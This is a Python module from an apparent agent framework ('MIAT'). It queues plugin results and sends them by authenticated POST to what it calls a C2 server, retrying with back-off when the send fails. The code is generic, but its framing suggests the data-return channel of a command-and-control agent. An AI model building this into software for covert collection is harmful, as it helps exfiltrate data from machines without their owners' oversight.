#!/usr/bin/env python3
# agent/telemetry.py
import asyncio, logging
from plugin_base import PluginResult

logger = logging.getLogger('MIAT.Telemetry')

MAX_QUEUE_SIZE  = 500
RETRY_DELAYS    = [5, 15, 30, 60]   # seconds between retry attempts


class TelemetryEngine:
    """
    asyncio.Queue that buffers PluginResult objects and drains them to the
    C2 server via authenticated POST.  If the server is unreachable, results
    are retained in the queue and retried with back-off — no data is lost
    during short network outages.
    """

    def __init__(self, transport, ws_thread=None) -> None:
        self._transport = transport
        self._ws_thread = ws_thread
        self._queue     = asyncio.Queue(maxsize=MAX_QUEUE_SIZE)
        self._running   = False
        self._task      : asyncio.Task | None = None

    # ── Public API ────────────────────────────────────────────────────────────

    @property
    def queue(self) -> asyncio.Queue:
        return self._queue

    @property
    def queue_size(self) -> int:
        return self._queue.qsize()

    async def run(self) -> None:
        """Background drain coroutine — launch with asyncio.create_task()."""
        self._running = True
        logger.info('TelemetryEngine started')
        while self._running:
            try:
                result: PluginResult = await asyncio.wait_for(
                    self._queue.get(), timeout=5.0
                )
                await self._post_with_retry(result)
                self._queue.task_done()
            except asyncio.TimeoutError:
                continue
            except asyncio.CancelledError:
                break
            except Exception as exc:
                logger.error(f'TelemetryEngine drain error: {exc}')
        logger.info('TelemetryEngine stopped')

    def stop(self) -> None:
        self._running = False

    # ── Internal ──────────────────────────────────────────────────────────────

    async def _post_with_retry(self, result: PluginResult) -> None:
        loop    = asyncio.get_event_loop()
        payload = {**result.data, 'plugin': result.plugin_name}
        delays  = RETRY_DELAYS[:]

        while True:
            try:
                await loop.run_in_executor(
                    None,
                    lambda: self._transport.post(result.endpoint, payload),
                )
                logger.debug(
                    f'Telemetry POST OK: {result.plugin_name} → {result.endpoint}'
                )
                return
            except Exception as exc:
                if not delays:
                    logger.error(
                        f'Telemetry gave up after all retries for '
                        f'{result.plugin_name}: {exc}'
                    )
                    return
                wait = delays.pop(0)
                logger.warning(
                    f'Telemetry POST failed ({exc}). '
                    f'Retrying in {wait}s …'
                )
                await asyncio.sleep(wait)